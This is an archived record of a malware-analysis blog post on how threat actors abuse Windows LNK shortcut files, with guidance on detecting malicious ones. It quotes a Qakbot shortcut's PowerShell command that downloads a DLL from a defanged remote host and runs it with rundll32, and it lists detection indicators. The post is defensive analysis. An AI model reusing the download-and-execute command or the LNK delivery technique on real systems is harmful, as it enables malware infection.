{
    "id": "b3e361fd-c64f-4380-810b-7b5ee110629d",
    "created_at": "2023-01-12T15:01:42.059128Z",
    "updated_at": "2025-03-27T02:06:02.487085Z",
    "deleted_at": null,
    "sha1_hash": "337e611ff12d630b6027823128e609b1ddfa29c4",
    "title": "2022-11-10 - How LNK Files Are Abused by Threat Actors",
    "authors": "",
    "file_creation_date": "2022-11-28T19:02:54Z",
    "file_modification_date": "2022-11-28T19:02:54Z",
    "file_size": 594810,
    "plain_text": "# How LNK Files Are Abused by Threat Actors\n\n**[intezer.com/blog/malware-analysis/how-threat-actors-abuse-lnk-files/](https://www.intezer.com/blog/malware-analysis/how-threat-actors-abuse-lnk-files/)**\n\nWritten by Nicole Fishbein - 10 November 2022\n\n### Get Free Account\n\nJoin Now\n\n\nNovember 10, 2022\n\n\n-----\n\nLNK files are based on the Shell Link Binary file format, also known as Windows shortcuts.\nBut what seems a relatively simple ability to execute other binaries on the system can inflict\ngreat harm when abused by threat actors.\n\n[Microsoft’s decision to block macros by default for files downloaded from the internet in](https://learn.microsoft.com/en-gb/DeployOffice/security/internet-macros-blocked)\nOffice applications provoked malware developers to shift to other techniques. Threat actors\nhave identified the potential profit of using LNK files in different stages of attacks as we\n[expect to see an increased number of attacks using LNK files, such as Bumblebee and](https://www.proofpoint.com/us/blog/threat-insight/how-threat-actors-are-adapting-post-macro-world)\n[Quantum Ransomware.](https://thedfirreport.com/2022/04/25/quantum-ransomware/)\n\nIn this blog, we will cover the file format to understand better how threat actors use LNK\nfiles in the different stages of attacks. By getting familiar with the LNK (Shell Link) file format\nand its capabilities, we will present open-source tools and methods to inspect and detect\nmalicious LNK files in incident response and threat-hunting processes.\n\n## What is the LNK File Format?\n\nThe five structures that compose a shell link binary (LNK) file.\nAccording to Microsoft’s [documentation on Shell Link Binary files, the most common way to](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/a6c2f32d-2297-4727-bcd3-5d3669573bcb)\nstore Shell Link Binary files is by using the .lnk file extension. LNK files contains a reference\nto a location on the system referred to as a link target. The format consists of five\nstructures: some are mandatory, while others are optional. We will not cover every\nparameter in the structures, but focus on the parameters that can help identify suspicious\nLNK files.\n\n**1. SHELL_LINK_HEADER – This is a mandatory structure that contains information and**\nflags necessary for the rest of the structures in the file.\n\n[LinkFlags structure specific, which shell link structures (described below) are present](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ae350202-3ba9-4790-9e9e-98935f4ee5af)\nin the file. For example, if the HasRelativePath flag is set, RELATIVE_PATH in the\n**STRING_DATA structure will contain the relevant information.**\n[FileAttributesFlags structure holds information about the attributes of the link target.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/378f485c-0be9-47a4-a261-7df467c3c9c6)\nFor example, if the FILE_ATTRIBUTE_DIRECTORY bit is set, the target is a directory\nrather than a file. The fields in this structure can provide more context about the link\ntarget, which can help the investigation process.\nAccess, creation, and write time: this can be useful to determine the creation and\nmodification time of the file as part of an incident response process.\n[HotKeyFlags structure specifies a combination of keys that will invoke the application.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8cd21240-1b5d-43e6-adc4-38cf14e30cea)\n\n\n-----\n\n**[2. LINKTARGET_IDLIST – Specifies the target of the link using ItemID structure.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/6ac3b286-6640-4cf3-85f2-4085c02e6a71)**\n\n**3. LINKINFO – Holds information about the location of a link target, including volume, serial**\nnumber, and local paths.\n\n**4. STRING_DATA – Holds information about paths and interfaces for the link target. The**\nstructures are optional, and they will be present only if the appropriate flag in LinkFlags (in\nthe ShellLinkHeader) is set. The following structures can be useful in identifying malicious\nLNK files:\n\nRELATIVE_PATH: defines the location of the link target relative to the file that\ncontains the shell link.\nWORKING_DIR: defines the file system path of the working directory to be used when\nactivating the link target.\nCOMMAND_LINE_ARGUMENTS: stores the command-line arguments specified\nwhen activating the link target.\n\n**5. EXTRA_DATA – Optional structures contain additional information about the link target.**\nOf all of the possible structures, the following can be very useful in the investigation:\n\nIf the link target uses an environment variable, the\n[EnvironmentVariableDataBlock structure will hold a path to environment variable](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/2224d03c-f417-44a0-81e3-df169938ba72)\ninformation.\nTrackerDataBlock: this structure holds information that helps locate the link target if it\nwasn’t found in its original location. One of the fields is the MAC address of the\nmachine where the link target was last seen. If the MAC address specified in the LNK\nfile doesn’t match the MAC address of the host, it means that LNK was created on\nanother machine. So we need to understand if it’s a machine within the organization\nor an authorized entity or if the file was created and dropped by an attacker.\n\n## How LNK files are used by threat actors\n\nLNK files can execute any file on the system with arguments (path, arguments, etc.) based\non the configuration provided by the file’s creator. The content of the LNK file – what and\nhow it will be executed – can be viewed using different tools or just by right-clicking it to\nopen the properties window of the file. But most users don’t check each LNK file before\nexecuting it. Essentially LNK files provide attackers with an easy way to execute malicious\n[binaries or trusted leaving-of-the-land binaries (LolBins).](https://lolbas-project.github.io/)\n\n\n-----\n\nInspecting LNK files using the properties window.\nUsually, LNK files are used in the delivery stage of the attack. The goal of this stage is to\ndeploy the next stage of the attack or execute the malware. One of the ways to deliver the\nmalicious files to the endpoint is using an archive file, a technique that attackers started to\n[use more extensively based on HP’s report from Q2 2022.](https://threatresearch.ext.hp.com/hp-wolf-security-threat-insights-report-q2-2022/) [Recently, attackers started to](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/#:~:text=During%20the%20second,the%20LNK%20attacks)\nuse LNK files as downloaders instead of packing the malicious code in the archive or using\nother file formats, such as macros. To carry out the attack, LNK files are set to execute\neither PowerShell, VBScript, or MSHTA with pre-defined arguments or execute commands\nfrom another file that is dropped with the LNK file.\n\n[Emotet used this technique in a phishing email they sent to the victims, including a](https://www.bleepingcomputer.com/news/security/emotet-malware-infects-users-again-after-fixing-broken-installer/#:~:text=last%20friday%2C%20the%20emotet%20malware%20distributors%20launched%20a%20new%20email%20campaign%20that%20included%20password-protected%20zip%20file%20attachments%20containing%20windows%20lnk%20(shortcut)%20files%20pretending%20to%20be%20word%20documents.)\npassword-protected zip file that contained an LNK file disguised as a Word document that\nexecutes a VBS script which downloads malware.\n\n[Bumblebee, a new and advanced loader, uses an LNK file as part of the attack flow. So far,](https://www.bleepingcomputer.com/news/security/bumblebee-malware-adds-post-exploitation-tool-for-stealthy-infections/)\nit has two versions, one delivered ISO file and the latter a VHD. In both cases, an LNK file is\nincluded. In the first version, the LNK executed the accompanying DLL, which contains the\nmalicious payload. The later version is more advanced, and the LNK file executes an\nattached PowerShell file that loads the second stage of the loader.\n\nSome malware developers took it one step further and created a tool for creating malicious\n[LNK files called Quantum, and it’s sold on the dark web. It allows other criminals to create](https://blog.cyble.com/2022/06/22/quantum-software-lnk-file-based-builders-growing-in-popularity/)\nmalicious files with extra capabilities such as UAC bypass, delayed execution, post\n\n-----\n\nexecution hiding, and a variety of double extensions.\n\n## How to Analyze and Detect Malicious LNK Files\n\nIn the process of incident response or threat hunting, when we have a suspicious file, we\ncan choose to do static analysis or dynamic analysis (or both). Executing an LNK file in a\nsandbox or a VM can greatly assist in identifying suspicious activity. However, as we saw in\nthe examples above, some attacks rely on additional files and parameters that the LNK file\nwill execute. In this case, we will need to have all of the relevant files in the testing\nenvironment, and this is not always possible so we will proceed to a static analysis.\n\nThere are multiple applications and tools to inspect the structure of an LNK file. In this post,\n[we will use LnkParse3, a minimalistic CLI tool based on python3 that is easy to install and](https://pypi.org/project/LnkParse3/)\nuse. The result of the parsing is presented in a format that resembles the LNK structure\ndescribed above.\n\nBased on LNK files that were used in previously reported attacks, we have gathered\nindicators that can help identify suspicious LNK files. This information can be pulled from\nthe LNK file using tools such as LnkParse3:\n\nLocal base path that points to legitimate Windows tools that can be used to execute\nscripts and open URLs: cmd, rundll32, PowerShell, MSHTA.\nSuspicious command line arguments that contain:\n\nCommands like exec, frombase64, ping, VBScript, etc.\nHigh amount of command line arguments – often malicious LNK files that\nspecify command line arguments will have more than four arguments. On top of\nthat, the arguments can be obfuscated or include characters that are not letters\nor numbers. But in some cases, legitimate files such as web browsers can run\nprocesses with many arguments, resulting in shortcut files with many command\nline arguments. In this case, the target and the working_dir locations can be very\nhelpful in the analysis and inspection of the command line arguments.\nNetworking protocols and URLs such as HTTP, HTTPS, and IP addresses.\n\nThe file size is relatively big – which indicates that it contains lots of data, possibly a\nscript. We noticed that files bigger than 4 KB should be considered suspicious files.\n\n[For example, below is the content of an LNK file used by Qakbot. It downloads a DLL from](https://analyze.intezer.com/files/a1e2a9bc32a2ff8392cc70586e34fb9ba86c5aaad3dffee0d4940a8adf742b13)\na remote location and executes it.\n```\n“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit iwr -Uri\n\nhxxps://news-wellness[.]com/5MVhfo8BnDub/D.png -OutFile\n\n$env:TEMP\\test.dll;Start-Process rundll32.exe $env:TEMP\\test.dll,jhbvygftr”\n\n```\nWe can then use URL reputation tools for analysis, like Intezer’s [URL scanning feature](https://www.intezer.com/blog/malware-analysis/url-analysis-phishing-part-1/)\nshown below to confirm that the LNK file is opening a malicious link\n\n\n-----\n\n[Intezer’s URL scanner showing the malicious link opened by a .lnk file.](https://www.intezer.com/intezer-analyze/)\nSome of the indicators can differ based on what is considered common in the organization,\nfor example, if it is common to have big LNK files that execute legitimate scripts. In this\ncase, the indicators need to be tailored for the organization, but overall malicious LNK files\nhave a pattern that can be identified.\n\nOnce we have classified an LNK file as suspicious, we should inspect the executables and\nthe commands that are being executed and identify what the purpose of the file is and\nwhether the endpoint was compromised.\n\n## Conclusion\n\nWith the increasing use of LNK files by threat actors, defenders and incident responders\nmust understand what these files can do and how to work around them. In this blog, we\ncovered the sections of the file format that can reveal suspicious indicators, then we\npresented real-life examples and presented an open-sourced tool that can be used to\ninspect LNK files.\n\n## Too many alerts and suspicious files to investigate manually?\n\nIntezer’s technology automates SOC grunt work like analyzing suspicious files, by\nmonitoring your alerts 24/7, investigating and triaging for you, kickstarting incident\nresponse, and helping you hunt down undetected threats.\n\n[Try Intezer for yourself for free](https://analyze.intezer.com/)\n\n**Nicole Fishbein**\n\n\n-----\n\nNicole is a malware analyst and reverse engineer. Prior to Intezer she was an embedded\nresearcher in the Israel Defense Forces (IDF) Intelligence Corps.\n\nCrowdStrike + Intezer: Automation for Alert Triage, Response, and HuntingCrowdStrike +\nIntezer: Automation for Alert Triage, Response, and Hunting [Learn more](https://www.intezer.com/blog/alert-triage/automate-triage-hunting-crowdstrike-integration/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-11-10 - How LNK Files Are Abused by Threat Actors.pdf"
    ],
    "report_names": [
        "2022-11-10 - How LNK Files Are Abused by Threat Actors.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535702,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1669662174,
    "ts_modification_date": 1669662174,
    "files": {
        "pdf": "https://archive.orkl.eu/337e611ff12d630b6027823128e609b1ddfa29c4.pdf",
        "text": "https://archive.orkl.eu/337e611ff12d630b6027823128e609b1ddfa29c4.txt",
        "img": "https://archive.orkl.eu/337e611ff12d630b6027823128e609b1ddfa29c4.jpg"
    }
}